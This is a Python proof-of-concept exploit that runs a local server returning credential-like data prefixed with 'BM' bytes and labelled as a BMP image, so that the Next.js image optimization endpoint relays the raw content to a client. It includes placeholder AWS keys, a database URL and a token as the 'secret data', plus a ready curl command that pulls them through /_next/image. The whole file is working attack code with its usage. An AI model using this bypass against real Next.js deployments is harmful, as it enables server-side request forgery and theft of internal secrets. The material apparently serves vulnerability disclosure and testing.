#!/usr/bin/env python3
"""
Data Exfiltration PoC - BMP Magic Byte Bypass
==============================================

This demonstrates how an attacker can exfiltrate arbitrary data
if an internal service prefixes its response with "BM" (BMP magic bytes).

Next.js checks: does the response start with 0x42 0x4D ("BM")?
If yes → treat as BMP image → return RAW buffer to client!

Real-world scenario:
- Internal monitoring page outputs "BMC Status: OK, CPU: 95%..."
- Internal CSV export starts with "BM," columns...
- Custom binary protocol starting with "BM"
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import sys

SECRET_DATA = """
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
DATABASE_URL=postgres://admin:supersecret@10.0.0.5:5432/production
API_TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0
INTERNAL_NOTES=This server contains PII for 50,000 customers
"""

class ExfilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Prefix with "BM" to bypass Next.js image validation
        # Next.js sees "BM" and thinks it's a BMP image!
        payload = b"BM" + SECRET_DATA.encode()
        
        print(f"\n[EXFIL] Request received: {self.path}")
        print(f"[EXFIL] Returning {len(payload)} bytes with BM prefix")
        
        self.send_response(200)
        self.send_header('Content-Type', 'image/bmp')  # Claim it's BMP
        self.send_header('Content-Length', len(payload))
        self.end_headers()
        self.wfile.write(payload)
    
    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    port = 9999
    print("=" * 60)
    print(" Data Exfiltration PoC - BMP Magic Byte Bypass")
    print("=" * 60)
    print(f"\nListening on 127.0.0.1:{port}")
    print("\nThe secret data:")
    print(SECRET_DATA)
    print("=" * 60)
    print("\nTest with:")
    print(f'  curl "http://localhost:3000/_next/image?url=http://127.0.0.1:{port}/secrets&w=64&q=75" --output exfil.bmp')
    print('  cat exfil.bmp  # Should show the secrets!')
    print("=" * 60)
    
    HTTPServer(('127.0.0.1', port), ExfilHandler).serve_forever()
